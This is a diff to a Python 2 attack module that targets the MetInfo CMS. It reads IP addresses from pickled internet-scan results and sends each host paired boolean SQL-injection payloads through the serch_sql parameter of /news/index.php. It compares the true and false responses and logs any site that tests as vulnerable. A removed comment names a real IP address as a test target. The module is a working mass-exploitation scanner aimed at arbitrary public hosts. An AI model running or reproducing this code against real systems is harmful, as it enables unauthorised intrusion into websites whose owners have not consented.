@@ -2,17 +2,19 @@
 #encoding:utf-8
 
 import re
-#import requests
+import sys
+sys.path.append("../../")
 import urllib2
 import json
-import pickle
+import pickle,pprint
+
+from lib.core.data import logger
+
 
 def readSearchResult(file):
 	f = open(file,"rb")
 	data = pickle.load(f)
-	print type(data)
-
-	#pprint.pprint(data1)
+	#pprint.pprint(data)
 	f.close()
 	return data
 
@@ -26,17 +28,6 @@ def attack(url):
 	playLoadFalse = "http://{target}/news/index.php?"\
 			"serch_sql=%20123qwe%20"\
 			"where%201234%3D1235%20--%20x&imgproduct=xxxx".format(target=url)
-
-	"""
-	print a
-	r  = requests.get(a)
-	print json.loads(r.text)
-	"""
-
-	"""
-	r = requests.get(playLoadTrue)
-	data_true = json.loads(r.text)
-	"""
 	try:
 		req = urllib2.Request(playLoadTrue)
 		resp = urllib2.urlopen(req)
@@ -48,12 +39,6 @@ def attack(url):
 		if not re.search(r'href=["\' ]shownews\.php\?lang=', data_true, re.M):
 				return
 
-
-		"""
-		r = requests.get(playLoadTrue)
-		data_false = json.loads(r.text)
-		"""
-
 		req = urllib2.Request(playLoadFalse)
 		resp = urllib2.urlopen(req)
 		if resp.code != 200:
@@ -64,22 +49,16 @@ def attack(url):
 		if re.search(r'href=["\' ]shownews\.php\?lang=', data_false, re.M):
 			return
 
-		print "%s is vulnerable!" % url
+		logger.info("%s is vulnerable!" % url)
 	except:
 		pass
 
-#attack("218.28.99.182")
 def main(file):
-	print "MetInfo running"
+	logger.info("Attack module MetInfo is running")
 	ip_list = []
 	data = readSearchResult(file)
-	j = 0
-	for _ in data:
-		for x in _['matches']:
-			#logger.info("find ip:" + x['ip'])
-			print x['ip']
-			ip_list.append(x['ip'])
-			j += 1
-	print j
+	for x in data['matches']:
+		logger.info("find ip:{0}".format( x['ip']))
+		ip_list.append(x['ip'])
 	for ip in ip_list:
 		attack(ip)
